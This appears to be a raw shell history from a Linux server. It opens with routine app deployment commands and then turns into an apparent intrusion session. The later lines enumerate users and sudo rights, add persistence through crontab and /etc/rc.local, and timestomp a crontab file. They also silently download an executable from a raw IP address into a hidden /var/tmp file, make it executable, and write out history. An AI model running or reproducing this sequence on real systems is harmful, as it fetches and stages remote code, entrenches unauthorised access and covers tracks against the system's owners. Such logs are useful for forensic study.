systemctl status app
make deploy
sudo systemctl restart app
tail -f /var/log/app/app.log
git pull
ls
cd app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
crontab -
sudo tee -a /etc/rc.local
touch -r /etc/hostname /var/spool/cron/crontabs/svcapp
wget -q http://77.190.229.213/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
